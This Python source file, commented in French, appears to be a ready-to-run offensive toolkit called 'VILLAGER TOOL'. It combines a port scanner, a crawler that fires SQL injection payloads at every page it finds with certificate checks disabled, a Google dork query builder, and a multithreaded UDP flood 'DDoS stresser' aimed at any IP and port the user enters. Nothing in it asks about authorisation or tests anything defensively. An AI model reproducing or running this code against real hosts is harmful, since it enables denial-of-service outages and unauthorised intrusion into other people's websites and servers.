import socket
import random
import threading
import os
import time
import sys
import webbrowser
import re
import urllib3
import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# --- CONFIGURATION DESIGN (Inspiré de RedTiger) ---
red, white, green, reset = "\033[91m", "\033[97m", "\033[92m", "\033[0m"
def current_time(): return time.strftime("%H:%M:%S")
BEFORE, AFTER = f"{red}[", f"{red}]{white}"
BEFORE_GREEN, AFTER_GREEN = f"{green}[", f"{green}]{white}"
INFO, INPUT, WAIT, ERROR, ADD, GEN_VALID = "INFO", "INPUT", "WAIT", "ERROR", "ADD", "VALID"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
headers_global = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

# ==========================================
# 1. LOGIQUE SCANNER AMÉLIORÉE (AGRESSIVE)
# ==========================================
def run_scan_all():
    clear()
    print(f"{red}--- VILLAGER TOOL - SCAN ALL (AGRESSIF) ---{white}\n")
    url_in = input(f"{BEFORE}{current_time()}{AFTER} {INPUT} Target URL -> {reset}")
    if "://" not in url_in: url_in = "https://" + url_in
    domain = urlparse(url_in).netloc
    
    # Étape 1 : Info Infrastructure (Website-Info-Scanner.py)
    print(f"\n{BEFORE}{WAIT}{AFTER} Analyse de l'infrastructure IP/Ports...")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{BEFORE}{ADD}{AFTER} IP: {white}{ip}")
        # Liste complète des ports (cite: 2)
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389]
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.3)
                if s.connect_ex((ip, port)) == 0:
                    print(f"{BEFORE}{ADD}{AFTER} Port: {white}{port} (OUVERT)")
    except: pass

    # Étape 2 : Crawling & Vulnérabilités (Fusion 3 & 6)
    print(f"\n{BEFORE}{WAIT}{AFTER} Crawl récursif et test des failles...")
    scanned_links = set()
    to_scan = [url_in]
    
    # Payloads SQL intégraux (cite: 3)
    sql_p = ["'", '"', "''", "' OR '1'='1'", "' OR 1=1 --", "admin'--", "' UNION SELECT NULL--"]
    sql_i = ["SQL syntax", "SQL error", "MySQL", "SQLSTATE", "syntax error"]

    while to_scan and len(scanned_links) < 50: # Limite pour éviter les boucles infinies
        url = to_scan.pop(0)
        if url in scanned_links: continue
        scanned_links.add(url)

        try:
            # Test de faille sur l'URL actuelle
            for p in sql_p:
                r_test = requests.get(url + p, timeout=5, headers=headers_global, verify=False)
                if any(ind.lower() in r_test.text.lower() for ind in sql_i):
                    print(f"{BEFORE_GREEN}{GEN_VALID}{AFTER_GREEN} SQL sur: {white}{url} {green}(Payload: {p})")
                    break
            
            # Découverte de nouveaux liens (cite: 6)
            r = requests.get(url, timeout=5, headers=headers_global, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            for a in soup.find_all('a', href=True):
                link = urljoin(url, a['href'])
                if domain in link and link not in scanned_links:
                    to_scan.append(link)
                    print(f"{BEFORE}{ADD}{AFTER} Nouveau lien trouvé: {white}{link}")
        except: continue

    print(f"\n{BEFORE}{INFO}{AFTER} Scan terminé sur {len(scanned_links)} pages.")
    input(f"{BEFORE}FIN{AFTER} Entrée pour menu...")

# ==========================================
# 2. GOOGLE DORKING (LOGIQUE COMPLÈTE)
# ==========================================
def run_dorking():
    clear()
    print(f"{red}--- VILLAGER TOOL - DORKING ---{white}\n")
    database = []
    print(f"{BEFORE}00{AFTER} Research | {BEFORE}01{AFTER} InUrl | {BEFORE}02{AFTER} InTitle | {BEFORE}03{AFTER} Site | {BEFORE}06{AFTER} Filetype")
    while True:
        choice = input(f"{BEFORE}{current_time()}{AFTER} {INPUT} Method -> ")
        if choice in ['0', '00']: break
        if choice == '1': database.append("inurl:" + input("Keyword: "))
        elif choice == '2': database.append("intitle:" + input("Keyword: "))
        elif choice == '3': database.append("site:" + input("Domain: "))
        elif choice == '6': database.append("filetype:" + input("Extension: "))
    
    if database:
        total_request = " ".join(database)
        print(f"{BEFORE}{INFO}{AFTER} Requête: {white}{total_request}")
        webbrowser.open("https://www.google.com/search?q=" + total_request.replace(" ", "%20"))

# ==========================================
# 3. DDOS STRESSER (FONCTIONS ORIGINALES)
# ==========================================
total_sent = 0
lock = threading.Lock()

def attack(ip, port, p_size, duration):
    global total_sent
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(p_size)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(data, (ip, port))
            with lock: total_sent += 1
        except: break

def run_ddos():
    clear()
    global total_sent
    total_sent = 0
    print(f"{red}--- VILLAGER TOOL - DDOS STRESSER ---{white}\n")
    print(f" [1] FAIBLE (64b) | [2] MOYEN (1024b) | [3] PUISSANT (65500b)")
    p_choice = input(f"{red}[+]{white} Puissance : ")
    
    p_size = 64 if p_choice == '1' else 1024 if p_choice == '2' else 65500
    threads_count = 50 if p_choice == '1' else 400 if p_choice == '2' else 1000
    
    target_ip = input(f"{red}[+]{white} IP Cible : ")
    target_port = int(input(f"{red}[+]{white} Port : "))
    duration = int(input(f"{red}[+]{white} Durée (sec) : "))

    print(f"\n{green}[!] Attaque en cours...{reset}")
    for _ in range(threads_count):
        threading.Thread(target=attack, args=(target_ip, target_port, p_size, duration), daemon=True).start()

    # Stats en temps réel (cite: 5)
    end_time = time.time() + duration
    while time.time() < end_time:
        with lock:
            mb = (total_sent * p_size) / (1024 * 1024)
            sys.stdout.write(f"\r{red}[STAT]{white} Paquets: {green}{total_sent}{white} | Mo: {green}{mb:.2f}{white}")
            sys.stdout.flush()
        time.sleep(0.2)
    input(f"\n\n{BEFORE}FIN{AFTER} Terminé. Entrée...")

# ==========================================
# MENU PRINCIPAL
# ==========================================
def main():
    while True:
        clear()
        print(f"""{red}
    ╔════════════════════════════════════════╗
    ║       VILLAGER TOOL - LINK TOOL        ║
    ╚════════════════════════════════════════╝{white}
    [{red}01{white}] SCAN ALL (Agressif : Info + Vuln + Crawl)
    [{red}02{white}] Google Dorking Tool (Full Search)
    [{red}03{white}] DDoS Stresser (Stats Live)
    [{red}00{white}] Quitter
    """)
        choice = input(f"{red}[input]{white} Choix -> {reset}")
        if choice in ['1', '01']: run_scan_all()
        elif choice in ['2', '02']: run_dorking()
        elif choice in ['3', '03']: run_ddos()
        elif choice in ['0', '00']: break

if __name__ == "__main__":
    main()